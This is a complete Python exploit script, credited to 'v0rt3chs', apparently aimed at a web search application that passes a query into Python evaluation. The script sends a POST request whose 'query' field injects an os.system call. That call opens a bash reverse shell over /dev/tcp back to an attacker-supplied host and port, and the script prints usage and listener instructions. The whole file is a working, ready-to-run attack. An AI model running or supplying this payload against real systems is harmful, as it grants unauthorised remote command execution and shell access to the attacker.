#!/bin/python3
import requests
import sys

if (len(sys.argv)!=4):
    print("Usage:\npython3 exploit.py <http://target.url> <LHOST> <LPORT>")
    exit()
target = sys.argv[1]
lhost = sys.argv[2]
lport = sys.argv[3]

if (target[0] != 'h'):
    print("\n\"Target\" argument must be in -- http://target.url/ -- format")
    exit()


print('''


 _______                       __                    _______       __            __   
|     __.-----.---.-.----.----|  |--.-----.----.    |_     _.-----|__.-----.----|  |_ 
|__     |  -__|  _  |   _|  __|     |  _  |   _|     _|   |_|     |  |  -__|  __|   _|
|_______|_____|___._|__| |____|__|__|_____|__|      |_______|__|__|  |_____|____|____|
                                                                 |___|               
By: v0rt3chs

''')      

print("(-) Building Request...")
headers = {
    'Content-Type': 'application/x-www-form-urlencoded',
}
data = 'engine=Google&query=\',__import__(\'os\').system(\'bash+-c+\\\'bash+-i+>%26+/dev/tcp/' + lhost + '/' + lport + '+0>%261\\\'|bash+-i\'))+%23+v0rt3chs'
print("(+) Sending Request...")
print("If you get a shell, wait a few seconds and press ctrl+c\n\n")
response = requests.post(target, headers=headers, data=data)

print("Request sent but no session was created! Is your listener setup properly?")
